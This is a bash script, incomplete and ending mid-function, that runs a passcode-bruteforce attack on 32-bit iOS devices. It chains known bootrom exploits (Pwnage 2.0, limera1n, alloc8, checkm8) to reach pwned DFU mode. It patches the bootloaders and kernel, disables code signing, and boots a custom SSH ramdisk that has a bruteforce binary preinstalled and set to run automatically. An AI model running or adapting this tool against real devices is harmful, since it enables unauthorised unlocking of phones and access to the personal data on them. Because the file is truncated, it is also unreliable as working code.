#!/usr/bin/env bash

# Bruteforce Tool for 32-bit iOS Devices

ssh_port=6414

[[ "$BASH_VERSION" ]] || { echo "[Error] Run with bash."; exit 1; }
bash_ver=$(/usr/bin/env bash -c 'echo ${BASH_VERSINFO[0]}')

PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
[[ -z "$PROJECT_ROOT" ]] && PROJECT_ROOT="$(pwd)"
export PROJECT_ROOT

# ==================== UTILITY FUNCTIONS ====================

print() { echo "${color_B}${1}${color_N}"; }
input() { echo "${color_Y}[Input] ${1}${color_N}"; }
log() { echo "${color_G}[Log] ${1}${color_N}"; }
warn() { echo "${color_Y}[WARNING] ${1}${color_N}"; }
error() {
    echo -e "${color_R}[Error] ${1}${color_N}"
    [[ -n "$2" ]] && echo -e "${color_Y}${*:2}${color_N}"
    exit 1
}
pause() { input "Press Enter to continue (Ctrl+C to cancel)"; read -s; }

clean() {
    kill $iproxy_pid 2>/dev/null
    popd &>/dev/null
    rm -rf "$(dirname "$0")/tmp$$/" 2>/dev/null
    [[ $platform == "macos" ]] && killall -CONT AMPDevicesAgent AMPDeviceDiscoveryAgent MobileDeviceUpdater 2>/dev/null
}

clean_usbmuxd() {
    clean
    sudo kill $sudoloop_pid 2>/dev/null
    sudo killall -9 usbmuxd usbmuxd2 2>/dev/null
    [[ $(command -v systemctl) ]] && sudo systemctl restart usbmuxd
}

display_help() {
    echo "
 BRUTEFORCE 32bit-DEVICE

Usage: ./Bruteforce.sh [Options]

Options:
    --help              Display this help
    --entry-device      Manual device entry
    --debug             Enable debugging

Supported: All 32bit-Device
    "
}


# ==================== TOOL PATHS ====================

set_tool_paths() {
    if [[ $OSTYPE == "linux"* ]]; then
        source /etc/os-release 2>/dev/null
        platform="linux"
        platform_ver="$PRETTY_NAME"
        [[ $(uname -m) == "a"* && $(getconf LONG_BIT) == 64 ]] && platform_arch="arm64" || platform_arch="x86_64"
        dir="$PROJECT_ROOT/bin/linux/$platform_arch"
        export LD_LIBRARY_PATH="$dir/lib"
        bspatch="$dir/bspatch"
        scp2="$dir/scp"; ssh2="$dir/ssh"
        cp $ssh2 . 2>/dev/null; chmod +x ssh 2>/dev/null
        trap "clean_usbmuxd" EXIT
        print "* Enter your user password when prompted"
        sudo -v
        (while true; do sudo -v; sleep 60; done) &
        sudoloop_pid=$!
        gaster="sudo $dir/gaster"; ipwnder="sudo $dir/ipwnder"
        irecovery="sudo $dir/irecovery"; primepwn="sudo $dir/primepwn"
        sudo killall -9 usbmuxd usbmuxd2 2>/dev/null
        sudo -b $dir/usbmuxd -pf 2>/dev/null
    elif [[ $OSTYPE == "darwin"* ]]; then
        platform="macos"
        platform_ver="$(sw_vers -productVersion)"
        platform_arch="$(uname -m)"
        dir="$PROJECT_ROOT/bin/macos"
        [[ $platform_arch == "arm64" ]] && dir+="/arm64"
        xcode-select -p &>/dev/null || error "Install Xcode CLT: xcode-select --install"
        /usr/bin/xattr -cr $PROJECT_ROOT/bin/macos 2>/dev/null
        bspatch="$(command -v bspatch)"
        scp2="/usr/bin/scp"; ssh2="/usr/bin/ssh"
        gaster="$dir/gaster"; ipwnder="$dir/ipwnder"
        irecovery="$dir/irecovery"; primepwn="$dir/primepwn"
        a6meowing="$dir/a6meowing"
        killall -STOP AMPDevicesAgent AMPDeviceDiscoveryAgent MobileDeviceUpdater 2>/dev/null
        trap "clean" EXIT
    else
        error "Platform not supported."
    fi
    log "Platform: $platform ($platform_ver - $platform_arch)"
    [[ ! -d $dir ]] && error "Bin directory not found: $dir"
    chmod +x $dir/* 2>/dev/null
    aria2c="$(command -v aria2c)"; [[ -z $aria2c ]] && aria2c="$dir/aria2c"
    aria2c+=" --no-conf --download-result=hide"
    curl="$(command -v curl)"
    ideviceinfo="$dir/ideviceinfo"
    jq="$dir/jq"
    iproxy="$dir/iproxy"
    sshpass="$dir/sshpass"
    [[ ! -x $sshpass ]] && sshpass="$(command -v sshpass)"
    
    cp $PROJECT_ROOT/resources/ssh_config . 2>/dev/null
    ssh_opts="-F ./ssh_config -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
    [[ $(ssh -V 2>&1 | grep -c "SSH_[89]\|SSH_1") != 0 ]] && echo "    PubkeyAcceptedAlgorithms +ssh-rsa" >> ssh_config
    
    if [[ -n $sshpass ]]; then
        ssh2="$sshpass -p alpine $ssh2 $ssh_opts"
        scp2="$sshpass -p alpine $scp2 $ssh_opts"
    else
        ssh2="$ssh2 $ssh_opts"
        scp2="$scp2 $ssh_opts"
        warn "sshpass not found. You will need to enter the password 'alpine' manually."
    fi
}

# ==================== DOWNLOAD FUNCTIONS ====================

download_from_url() {
    local url="$1" file="$2"
    [[ -n "$file" ]] && rm -f "$file"
    if [[ -n "$file" ]]; then
        $aria2c "$url" -o "$file" 2>/dev/null || $curl -sL "$url" -o "$file" || wget -qO "$file" "$url"
    else
        $aria2c "$url" 2>/dev/null || $curl -sLO "$url" || wget -q "$url"
    fi
}

download_appledb() {
    local query="$1"
    if [[ $query == "ios" ]]; then
        local phone="iOS" build_id="$2"
        case $build_id in
            1[AC]* | [2345]* ) phone="iPhone%20Software";;
            7* ) phone="iPhone%20OS";;
        esac
        query="ios/${phone};${build_id}"
    fi
    for url in "https://api.appledb.dev/${query}.json" "https://raw.githubusercontent.com/littlebyteorg/appledb/gh-pages/${query}.json"; do
        download_from_url "$url" tmp.json
        [[ -s tmp.json ]] && break
    done
    [[ ! -s tmp.json ]] && error "Failed to get AppleDB request."
}

# ==================== DEVICE FUNCTIONS ====================

device_get_name() {
    case $device_type in
        iPhone1,1) device_name="iPhone 2G";; iPhone1,2) device_name="iPhone 3G";;
        iPhone2,1) device_name="iPhone 3GS";; iPhone3,*) device_name="iPhone 4";;
        iPhone4,1) device_name="iPhone 4S";; iPhone5,*) device_name="iPhone 5/5C";;
        iPad1,1) device_name="iPad 1";; iPad2,[1234]) device_name="iPad 2";;
        iPad2,[567]) device_name="iPad mini 1";; iPad3,[123]) device_name="iPad 3";;
        iPad3,[456]) device_name="iPad 4";;
        iPod1,1) device_name="iPod touch 1";; iPod2,1) device_name="iPod touch 2";;
        iPod3,1) device_name="iPod touch 3";; iPod4,1) device_name="iPod touch 4";;
        iPod5,1) device_name="iPod touch 5";; *) device_name="$device_type";;
    esac
}

device_get_info() {
    if [[ $main_argmode == "device_enter_ramdisk_menu" ]]; then
        log "Assuming device is in SSH ramdisk mode"
        device_mode="Normal"
    else
        log "Finding device..."
        $ideviceinfo -s >/dev/null 2>&1 && device_mode="Normal"
        [[ -z $device_mode ]] && device_mode="$($irecovery -q 2>/dev/null | grep -w "MODE" | cut -c 7- | xargs)"
    fi
    if [[ -z $device_mode ]]; then
        local error_msg=$'* Make sure to trust this computer on the device screen.\n* Double-check if the device is detected by iTunes/Finder.\n* Try using a different USB port or cable.'
        error "No device found! Connect your iOS device." "$error_msg"
    fi
    
    case $device_mode in
        "DFU" | "Recovery" | "WTF" | "iBSS" | "iBEC" )
            [[ -n $device_argmode ]] && device_entry || {
                device_type=$($irecovery -q | grep "PRODUCT" | cut -c 10-)
                device_ecid=$(printf "%d" $($irecovery -q | grep "ECID" | cut -c 7-)) 2>/dev/null
                device_model=$($irecovery -q | grep "MODEL" | cut -c 8-)
            }
            device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
        ;;
        "Normal" )
            [[ -n $device_argmode ]] && device_entry || {
                device_type=$($ideviceinfo -s -k ProductType 2>/dev/null)
                [[ -z $device_type ]] && device_type=$($ideviceinfo -k ProductType 2>/dev/null)
                device_ecid=$($ideviceinfo -s -k UniqueChipID 2>/dev/null)
                device_model=$($ideviceinfo -s -k HardwareModel 2>/dev/null)
                device_vers=$($ideviceinfo -s -k ProductVersion 2>/dev/null)
                device_udid=$($ideviceinfo -s -k UniqueDeviceID 2>/dev/null)
                [[ -z $device_udid ]] && device_udid=$($ideviceinfo -k UniqueDeviceID 2>/dev/null)
            }
        ;;
    esac
    device_model="$(echo $device_model | tr '[:upper:]' '[:lower:]')"
    device_model="${device_model%ap}"
    
    # Device Type Fallback Mapping
    if [[ -z $device_type ]]; then
        case $device_model in
            m68  ) device_type="iPhone1,1";; n82  ) device_type="iPhone1,2";;
            n88  ) device_type="iPhone2,1";; n90  ) device_type="iPhone3,1";;
            n90b ) device_type="iPhone3,2";; n92  ) device_type="iPhone3,3";;
            n94  ) device_type="iPhone4,1";; n41  ) device_type="iPhone5,1";;
            n42  ) device_type="iPhone5,2";; n48  ) device_type="iPhone5,3";;
            n49  ) device_type="iPhone5,4";; n51  ) device_type="iPhone6,1";;
            n53  ) device_type="iPhone6,2";; n56  ) device_type="iPhone7,1";;
            n61  ) device_type="iPhone7,2";; k48  ) device_type="iPad1,1";;
            k93  ) device_type="iPad2,1";; k94  ) device_type="iPad2,2";;
            k95  ) device_type="iPad2,3";; k93a ) device_type="iPad2,4";;
            p105 ) device_type="iPad2,5";; p106 ) device_type="iPad2,6";;
            p107 ) device_type="iPad2,7";; j1   ) device_type="iPad3,1";;
            j2   ) device_type="iPad3,2";; j2a  ) device_type="iPad3,3";;
            p101 ) device_type="iPad3,4";; p102 ) device_type="iPad3,5";;
            p103 ) device_type="iPad3,6";; j71  ) device_type="iPad4,1";;
            j72  ) device_type="iPad4,2";; j73  ) device_type="iPad4,3";;
            n45  ) device_type="iPod1,1";; n72  ) device_type="iPod2,1";;
            n18  ) device_type="iPod3,1";; n81  ) device_type="iPod4,1";;
            n78  ) device_type="iPod5,1";;
        esac
    fi
    
    # If still empty, prompt user
    if [[ -z $device_type ]]; then
        warn "Could not detect device type automatically."
        device_entry
    fi
    device_get_name
    echo
    print "* Device: $device_name ($device_type)"
    print "* Mode: $device_mode"
    [[ -n $device_vers ]] && print "* iOS: $device_vers"
    print "* ECID: $device_ecid"
    echo
    
    case $device_type in
        iPhone1,1 | iPod1,1 ) device_proc=0;; # S5L8900
        iPhone1,2 | iPod2,1 ) device_proc=1;; # S5L8720
        iPhone2,1 | iPod3,1 ) device_proc=2;; # S5L8920
        iPhone3,[123] | iPod4,1 | iPad1,1 ) device_proc=4;; # A4
        iPad2,* | iPad3,[123] | iPhone4,1 | iPod5,1 ) device_proc=5;; # A5
        iPad3,[456] | iPhone5,* ) device_proc=6;; # A6
        *) error "Device not supported: $device_type";;
    esac
    all_flash="Firmware/all_flash/all_flash.${device_model}ap.production"
    device_fw_dir="$PROJECT_ROOT/saved/firmware/$device_type"
    mkdir -p $device_fw_dir $PROJECT_ROOT/saved/$device_type
}

device_entry() {
    log "Manual device entry enabled."
    until [[ -n $device_type && $device_type == iP* ]]; do read -p "$(input 'Device type (eg. iPad2,1): ')" device_type; done
    until [[ -n $device_ecid ]] && [ "$device_ecid" -eq "$device_ecid" ] 2>/dev/null; do read -p "$(input 'ECID (decimal): ')" device_ecid; done
}

device_find_mode() {
    local i=0 timeout=${2:-10}
    log "Finding device in $1 mode..."
    while (( i < timeout )); do
        device_mode="$($irecovery -q 2>/dev/null | grep -w "MODE" | cut -c 7-)"
        [[ $device_mode == "$1" ]] && { log "Found device in $1 mode."; return; }
        sleep 1; ((i++))
    done
    error "Failed to find device in $1 mode."
}

device_dfuhelper() {
    [[ $device_mode == "DFU" ]] && { log "Already in DFU mode"; return; }
    echo
    print "* DFU Mode Helper"
    print "* Get ready to enter DFU mode."
    pause
    echo
    print "* Hold TOP and HOME buttons..."
    for i in {10..1}; do echo -n "$i "; sleep 1; done
    echo
    print "* Release TOP, keep holding HOME..."
    for i in {8..1}; do echo -n "$i "; sleep 1; done
    echo
    device_find_mode DFU
}

# ==================== PWNDFU / EXPLOITS ====================

enter_pwndfu() {
    [[ $device_mode == "DFU" || $device_mode == "iBSS" || $device_mode == "iBEC" ]] && device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
    
    if [[ $device_mode == "iBSS" || $device_mode == "iBEC" ]]; then
        log "Device is already in $device_mode mode."
        return
    fi
    
    # 1. Handle S5L8900 (2G, 3G, iPod 1, iPod 2) - "WTF" Exploit
    if [[ $device_proc == 0 || $device_proc == 1 ]]; then
        [[ $device_mode != "DFU" ]] && device_enter_mode DFU
        if [[ $device_pwnd == "Pwnage 2.0" ]]; then
            log "Already in Pwnage 2.0 mode."
            return
        fi
        
        log "S5L8900/S5L8720 device detected. Using 24kpwn/WTF exploit..."
        
        # Download WTF DFU
        local wtf_name="WTF.s5l8900xall.RELEASE.dfu"
        local wtf_url="http://appldnld.apple.com/iPhone/061-7481.20100202.4orot/iPhone1,1_3.1.3_7E18_Restore.ipsw"
        if [[ ! -s $PROJECT_ROOT/saved/$wtf_name ]]; then
             log "Downloading WTF DFU..."
            "$dir/pzb" -g "Firmware/dfu/$wtf_name" -o "$PROJECT_ROOT/saved/$wtf_name" "$wtf_url"
        fi
        
        # Patch WTF
        local wtf_patched="$PROJECT_ROOT/saved/$wtf_name.patched"
        if [[ ! -s "$PROJECT_ROOT/resources/patch/WTF.s5l8900xall.RELEASE.patch" ]]; then
             error "Patch file not found: resources/patch/WTF.s5l8900xall.RELEASE.patch"
        fi
        
        log "Patching WTF DFU..."
        $bspatch "$PROJECT_ROOT/saved/$wtf_name" "$wtf_patched" "$PROJECT_ROOT/resources/patch/WTF.s5l8900xall.RELEASE.patch"
        
        # Send Exploit
        log "Sending Pwnage 2.0 exploit..."
        $irecovery -f "$wtf_patched"
        sleep 2
        
        # Verify
        device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
        if [[ -z $device_pwnd ]]; then
             # Check SRTG just in case
             local srtg="$($irecovery -q | grep "SRTG" | cut -c 7-)"
             if [[ $srtg == "iBoot-636.66.3x" ]]; then
                 log "Exploit success (SRTG verified)."
                 device_pwnd="Pwnage 2.0"
             else
                 warn "Exploit might have failed. Please re-enter DFU and try again if it fails."
             fi
        else
             log "Exploit success: $device_pwnd"
        fi
        return
    fi

    # 2. Handle S5L8920 (3GS, iPod 3) - Alloc8
    if [[ $device_proc == 2 ]]; then 
         if [[ -n $device_pwnd ]]; then
              log "Already in pwned DFU."
              return
         fi
         
         [[ $device_mode != "DFU" ]] && device_enter_mode DFU
         
         log "S5L8920 device detected. Using ipwnder + alloc8..."
         
         # Step 2a: Enter PwnDFU first using ipwnder/reipwnder
         local tool="ipwnder"
         [[ $platform == "macos" ]] && tool="reipwnder"
         
         log "Stage 1: Entering pwnDFU using $tool..."
         case $tool in
             "reipwnder" )
                 mkdir -p shellcode
                 cp $PROJECT_ROOT/resources/limera1n-shellcode.bin shellcode/
                 $PROJECT_ROOT/bin/macos/reipwnder -p
             ;;
             "ipwnder" ) $ipwnder -p;;
         esac
         
         sleep 1
         device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
         if [[ -z $device_pwnd ]]; then
              error "Failed to enter pwnDFU (Stage 1). Cannot proceed to alloc8."
         fi
         log "Stage 1 success: $device_pwnd"
         
         # Step 2b: Run Alloc8
         log "Stage 2: Running alloc8 exploit (this takes time)..."
         
         # Need ipwndfu
         local python2="$(command -v python2)"
         if [[ -z $python2 ]]; then
             warn "python2 not found (required for alloc8). Please install python2."
             error "Missing dependency: python2"
         fi

         # Download 4.3.5 iBSS for alloc8
         local alloc8_ibss="$PROJECT_ROOT/saved/n88ap-iBSS-4.3.5.img3"
         if [[ ! -s $alloc8_ibss ]]; then
             log "Downloading alloc8 iBSS..."
             "$dir/pzb" -g "Firmware/dfu/iBSS.n88ap.RELEASE.dfu" -o "$alloc8_ibss" http://appldnld.apple.com/iPhone4/041-1965.20110721.gxUB5/iPhone2,1_4.3.5_8L1_Restore.ipsw
         fi
         
         # Setup ipwndfu
         mkdir -p $PROJECT_ROOT/resources/ipwndfu
         if [[ ! -s $PROJECT_ROOT/resources/ipwndfu/ipwndfu ]]; then
             log "Downloading ipwndfu..."
             download_from_url "https://github.com/LukeZGD/ipwndfu/archive/refs/heads/master.zip" ipwndfu.zip
             unzip -q ipwndfu.zip -d $PROJECT_ROOT/resources/
             rm -rf $PROJECT_ROOT/resources/ipwndfu
             mv $PROJECT_ROOT/resources/ipwndfu-* $PROJECT_ROOT/resources/ipwndfu
         fi
         cp "$alloc8_ibss" $PROJECT_ROOT/resources/ipwndfu/
         
         # Run alloc8
         pushd $PROJECT_ROOT/resources/ipwndfu >/dev/null
         "$python2" ipwndfu -x
         popd >/dev/null
         
         sleep 2
         device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
         log "Alloc8 finished. Device status: $device_pwnd"
         return
    fi
    
    # PWNDFU for A5
    if [[ $device_proc == 5 ]]; then
        if [[ -n $device_pwnd ]]; then
            log "Device in pwned DFU: $device_pwnd"
        else
            [[ $device_mode != "DFU" ]] && device_enter_mode DFU
            echo
            print "* A5(X) device detected - checkm8-a5 required"
            print "* You need Raspberry Pi Pico or Arduino+USB Host Shield"
            print "* Details: https://github.com/LukeZGD/checkm8-a5"
            echo
            log "Pwn device with checkm8-a5, then plug it back and press Enter."
            pause
            device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
            [[ -z $device_pwnd ]] && error "Device NOT in pwned DFU mode."
            log "Found device in pwned DFU: $device_pwnd"
        fi
        ipwndfu_send_ibss
        return
    fi
    
    # PWNDFU for A4/A6
    if [[ -n $device_pwnd ]]; then
        log "Device in pwned DFU: $device_pwnd"
        [[ $device_proc == 6 ]] && ipwndfu_send_ibss
        return
    fi
    
    [[ $device_mode != "DFU" ]] && device_enter_mode DFU
    
    local tool="gaster"
    if [[ $device_proc == 4 ]]; then
        tool="primepwn"
        [[ $platform == "macos" ]] && tool="reipwnder"
    elif [[ $device_proc == 6 ]]; then
        tool="ipwndfu"
        if [[ $platform == "macos" ]]; then
            tool="ipwndfu"
            [[ $platform_arch == "arm64" ]] && [[ ! -x "$dir/ipwnder32" ]] && tool="ipwndfu"
        fi
    fi
    
    log "Placing device in pwnDFU using $tool..."
    sleep 1
    case $tool in
        "gaster" ) $gaster pwn; $gaster reset;;
        "a6meowing" ) $dir/a6meowing;;
        "primepwn" ) $primepwn;;
        "reipwnder" )
            mkdir -p shellcode
            cp $PROJECT_ROOT/resources/limera1n-shellcode.bin shellcode/
            [[ -x $dir/reipwnder ]] && $dir/reipwnder -p || $PROJECT_ROOT/bin/macos/reipwnder -p
        ;;
        "ipwnder" ) $ipwnder -p;;
        "ipwnder32" ) "$dir/ipwnder32" -p;;
        "ipwnder_lite" ) $ipwnder -d;;
        "ipwndfu" )
            local python2="$(command -v python2)"
            [[ -z $python2 ]] && python2="/usr/bin/python"
            [[ ! -x $python2 ]] && error "python2 not found. Required for ipwndfu."
            
            # Setup ipwndfu
            mkdir -p $PROJECT_ROOT/resources/ipwndfu
            if [[ ! -s $PROJECT_ROOT/resources/ipwndfu/ipwndfu ]]; then
                log "Downloading ipwndfu..."
                download_from_url "https://github.com/LukeZGD/ipwndfu/archive/refs/heads/master.zip" ipwndfu.zip
                unzip -q ipwndfu.zip -d $PROJECT_ROOT/resources/
                rm -rf $PROJECT_ROOT/resources/ipwndfu
                mv $PROJECT_ROOT/resources/ipwndfu-* $PROJECT_ROOT/resources/ipwndfu
            fi
            
            pushd $PROJECT_ROOT/resources/ipwndfu >/dev/null
            $python2 ipwndfu -p
            sleep 2
            popd >/dev/null
        ;;
    esac
    
    log "Waiting for device to reconnect..."
    local check_retry=0
    while [[ $check_retry -lt 5 ]]; do
        sleep 2
        local irec_out="$($irecovery -q 2>&1)"
        device_pwnd=$(echo "$irec_out" | grep "PWND" | cut -c 7- | xargs)
        local cur_mode=$(echo "$irec_out" | grep -w "MODE" | cut -c 7- | xargs)
        
        log "Pwn check $check_retry: mode=$cur_mode pwnd=$device_pwnd"
        
        if [[ -n $device_pwnd ]] || [[ $cur_mode == "iBSS" ]] || [[ $cur_mode == "iBEC" ]]; then
            log "Device is now in $cur_mode mode (pwn successful)."
            device_pwnd="${device_pwnd:-pwned}"
            break
        fi
        ((check_retry++))
    done

    if [[ -z $device_pwnd ]]; then
        local cur_mode=$(echo "$irec_out" | grep -w "MODE" | cut -c 7- | xargs)
        if [[ $cur_mode == "iBSS" || $cur_mode == "iBEC" ]]; then
            log "Device is now in $cur_mode mode (pwn & iBSS upload successful)."
            device_pwnd="pwned"
        else
            error "Failed to pwn device (Verification failed). \nOutput: $irec_out \nPlease try putting it in pwned DFU manually using: $dir/ipwnder32 -p"
        fi
    fi
    log "Device in pwned DFU: $device_pwnd"
    [[ $device_proc == 6 ]] && ipwndfu_send_ibss
}


device_enter_mode() {
    case $1 in
        "Recovery" )
            [[ $device_mode == "Normal" ]] && {
                log "Entering recovery mode..."
                "$dir/ideviceenterrecovery" "$device_udid" >/dev/null
                device_find_mode Recovery 50
            }
        ;;
        "DFU" )
            [[ $device_mode == "Normal" ]] && device_enter_mode Recovery
            [[ $device_mode == "DFU" ]] && return
            device_dfuhelper
        ;;
        "pwnDFU" )
            enter_pwndfu
        ;;
    esac
}

# ==================== FIRMWARE KEY ====================

device_fw_key_check() {
    local build="${1:-$device_target_build}"
    local keys_path="$device_fw_dir/$build"
    log "Checking firmware keys..."
    [[ $(cat "$keys_path/index.html" 2>/dev/null | grep -c "$build") != 1 ]] && rm -f "$keys_path/index.html"
    if [[ ! -e "$keys_path/index.html" ]]; then
        mkdir -p "$keys_path"
        for url in "https://raw.githubusercontent.com/LukeZGD/Legacy-iOS-Kit-Keys/master/$device_type/$build/index.html" \
                   "https://api.m1sta.xyz/wikiproxy/$device_type/$build"; do
            download_from_url "$url" index.html
            [[ $(cat index.html 2>/dev/null | grep -c "$build") == 1 ]] && break
            rm -f index.html
        done
        [[ $(cat index.html 2>/dev/null | grep -c "$build") != 1 ]] && error "Failed to get firmware keys."
        mv index.html "$keys_path/"
    fi
    device_fw_key="$(cat $keys_path/index.html)"
}

ipsw_get_url() {
    local build_id="$1"
    ipsw_url="$(cat "$device_fw_dir/$build_id/url" 2>/dev/null)"
    [[ -z $ipsw_url || $(echo "$ipsw_url" | grep -c '<') != 0 ]] && {
        log "Getting IPSW URL..."
        download_appledb ios $build_id
        ipsw_url="$(cat tmp.json | $jq -r ".sources[] | select(.type == \"ipsw\" and any(.deviceMap[]; . == \"$device_type\")) | .links[0].url")"
        [[ -z $ipsw_url ]] && error "Unable to get URL for $device_type-$build_id"
        mkdir -p $device_fw_dir/$build_id
        echo "$ipsw_url" > $device_fw_dir/$build_id/url
    }
}

# ==================== VERSION  ====================

select_ramdisk_version() {
    echo
    
    # Defaults for Legacy Devices
    case $device_type in
        iPhone1,1 | iPod1,1 ) 
            print "* Using iOS 3.1.3 (7E18) for 2G / iPod 1"
            device_target_build="7E18"
            return
        ;;
        iPhone1,2 | iPod2,1 )
            print "* Using iOS 4.2.1 (8C148) for 3G / iPod 2"
            device_target_build="8C148"
            return
        ;;
        iPhone2,1 )
            print "* Using iOS 6.1.6 (10B500) for 3GS"
            device_target_build="10B500"
            return
        ;;
        iPod3,1 )
            print "* Using iOS 5.1.1 (9B206) for iPod 3"
            device_target_build="9B206"
            return
        ;;
    esac

    if [[ $device_type == "iPad1,1" ]]; then
        # iPad 1: use iOS 5.1.1 (default)
        print "* Using iOS 5.1.1 (9B206) for iPad 1"
        device_target_build="9B206"
    elif [[ $device_proc == 4 ]]; then
        print "* Using iOS 6.1.3 (10B329) for A4 device"
        device_target_build="10B329"
    else
        print "* A5/A6 device - select iOS version:"
        print "  1. iOS 6.1.3 (10B329)"
        print "  2. iOS 9.0.2 (13A452) [default]"
        print "  3. Enter Build Number"
        read -p "$(input 'Enter choice [1/2/3]: ')" ver_choice
        case "${ver_choice:-2}" in
            1) device_target_build="10B329";;
            3) read -p "$(input 'Enter Build Number (e.g. 9B206): ')" device_target_build;;
            *) device_target_build="13A452";;
        esac
    fi
    log "Using build: $device_target_build"
}

# ==================== MAKE RAMDISK ====================

create_sshrd() {
    local comps=("iBSS" "iBEC" "DeviceTree" "Kernelcache" "RestoreRamdisk")
    local name iv key path ramdisk_path build_id
    
    select_ramdisk_version
    build_id="$device_target_build"
    
    device_fw_key_check
    ipsw_get_url $build_id
    ramdisk_path="$PROJECT_ROOT/saved/$device_type/ramdisk_$build_id"
    mkdir -p $ramdisk_path
    
    # Download and Decrypt 
    for getcomp in "${comps[@]}"; do
        name=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "'$getcomp'") | .filename')
        iv=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "'$getcomp'") | .iv')
        key=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "'$getcomp'") | .key')
        case $getcomp in
            "iBSS" | "iBEC" ) path="Firmware/dfu/";;
            "DeviceTree" ) path="$all_flash/";;
            * ) path="";;
        esac
        
        # Fallback names
        if [[ -z $name ]]; then
             if [[ $device_proc == 0 && $getcomp == "Kernelcache" ]]; then
                 name="kernelcache.release.s5l8900x"
             elif [[ $getcomp == "iBSS" ]]; then name="iBSS.$device_model.RELEASE.dfu";
             elif [[ $getcomp == "iBEC" ]]; then name="iBEC.$device_model.RELEASE.dfu"; 
             fi
        fi
        
        log "$getcomp"
        [[ -s $ramdisk_path/$name ]] && cp $ramdisk_path/$name . || "$dir/pzb" -g "${path}$name" -o "$name" "$ipsw_url"
        [[ ! -s $name ]] && error "Failed to get $name."
        [[ ! -s $ramdisk_path/$name ]] && cp $name $ramdisk_path/
        mv $name $getcomp.orig
        "$dir/xpwntool" $getcomp.orig $getcomp.dec -iv $iv -k $key -decrypt
    done
    
    # Patch Ramdisk
    log "Patching RestoreRamdisk..."
    "$dir/xpwntool" RestoreRamdisk.dec Ramdisk.raw
    "$dir/hfsplus" Ramdisk.raw grow 30000000
    "$dir/hfsplus" Ramdisk.raw untar $PROJECT_ROOT/resources/sshrd/sbplist.tar 2>/dev/null
    
    if [[ $device_proc == 0 || $device_proc == 1 || $device_type == "iPad1,1" ]]; then
        log "Legacy device detected (ARMv6 or iOS 5). Using Legacy SSH..."
        if [[ -s $PROJECT_ROOT/resources/sshrd/ssh_old.tar ]]; then
            "$dir/hfsplus" Ramdisk.raw untar $PROJECT_ROOT/resources/sshrd/ssh_old.tar
        else
            warn "ssh_old.tar not found! Trying standard ssh.tar (might fail)..."
            "$dir/hfsplus" Ramdisk.raw untar $PROJECT_ROOT/resources/sshrd/ssh.tar
        fi
    else
        "$dir/hfsplus" Ramdisk.raw untar $PROJECT_ROOT/resources/sshrd/ssh.tar
    fi
    
    "$dir/hfsplus" Ramdisk.raw mv sbin/reboot sbin/reboot_bak 2>/dev/null
    
    log "Adding bruteforce tools to ramdisk..."
    if [[ -s $PROJECT_ROOT/resources/bruteforce ]]; then
        "$dir/hfsplus" Ramdisk.raw add $PROJECT_ROOT/resources/bruteforce usr/bin/bruteforce
        "$dir/hfsplus" Ramdisk.raw chmod 755 usr/bin/bruteforce
    fi
    if [[ -s $PROJECT_ROOT/resources/device_infos ]]; then
        "$dir/hfsplus" Ramdisk.raw add $PROJECT_ROOT/resources/device_infos usr/bin/device_infos
        "$dir/hfsplus" Ramdisk.raw chmod 755 usr/bin/device_infos
    fi
    
    
    # Determine OS version for restored_external selection
    local ios_major="6"
    case $device_target_build in
        13*) ios_major="9";;
        12*) ios_major="8";;
        11*) ios_major="7";;
        10*) ios_major="6";;
        9*) ios_major="5";;
        8*) ios_major="4";;
        7*) ios_major="3";;
    esac

    local res_ext="$PROJECT_ROOT/resources/restored_external"
    if (( ios_major >= 6 )) && [[ -s $PROJECT_ROOT/resources/ios6/restored_external ]]; then
        res_ext="$PROJECT_ROOT/resources/ios6/restored_external"
        log "Using iOS 6+ restored_external..."
    fi

    if [[ -s $res_ext ]]; then
        "$dir/hfsplus" Ramdisk.raw rm usr/local/bin/restored_external.real 2>/dev/null
        "$dir/hfsplus" Ramdisk.raw add $res_ext usr/local/bin/restored_external.sshrd
        "$dir/hfsplus" Ramdisk.raw chmod 755 usr/local/bin/restored_external.sshrd
    fi
    
    if [[ -s $PROJECT_ROOT/resources/setup.sh ]]; then
        "$dir/hfsplus" Ramdisk.raw rm usr/local/bin/restored_external 2>/dev/null
        
        # Prepare setup.sh
        cp $PROJECT_ROOT/resources/setup.sh setup.temp
        
        "$dir/hfsplus" Ramdisk.raw add setup.temp usr/local/bin/restored_external
        "$dir/hfsplus" Ramdisk.raw chmod 755 usr/local/bin/restored_external
        rm -f setup.temp
    fi
    log "bruteforce auto enable"
    
    "$dir/xpwntool" Ramdisk.raw Ramdisk.dmg -t RestoreRamdisk.dec
    
    # Patch iBSS
    log "Patching iBSS..."
    "$dir/xpwntool" iBSS.dec iBSS.raw
    "$dir/iBoot32Patcher" iBSS.raw iBSS.patched --rsa --debug
    "$dir/xpwntool" iBSS.patched iBSS -t iBSS.dec
    
    # Patch iBEC
    log "Patching iBEC..."
    "$dir/xpwntool" iBEC.dec iBEC.raw
    "$dir/iBoot32Patcher" iBEC.raw iBEC.patched --rsa --debug -b "rd=md0 -v amfi=0xff cs_enforcement_disable=1"
    "$dir/xpwntool" iBEC.patched iBEC -t iBEC.dec
    
    # Patch Kernel
    log "Patching Kernelcache..."
    if [[ $device_proc == 0 ]]; then
        # S5L8900 Kernel Patching
        log "S5L8900 kernel patch from legacy ios kit."
        $bspatch Kernelcache.dec Kernelcache.patched $PROJECT_ROOT/resources/patch/kernelcache.release.s5l8900x.patch
    else 
        # kernel Patch
        cp Kernelcache.dec Kernelcache.dec.bak
        "$dir/xpwntool" Kernelcache.dec Kernelcache.raw
        if [[ -s $PROJECT_ROOT/resources/kernel_patch.py ]]; then
            # Determine OS version from build ID
            local ios_major="6"
            case $device_target_build in
                13*) ios_major="9";;
                12*) ios_major="8";;
                11*) ios_major="7";;
                10*) ios_major="6";;
                9*) ios_major="5";;
                8*) ios_major="4";;
            esac
            
            # Determine Arch
            local cpu_arch="armv7"
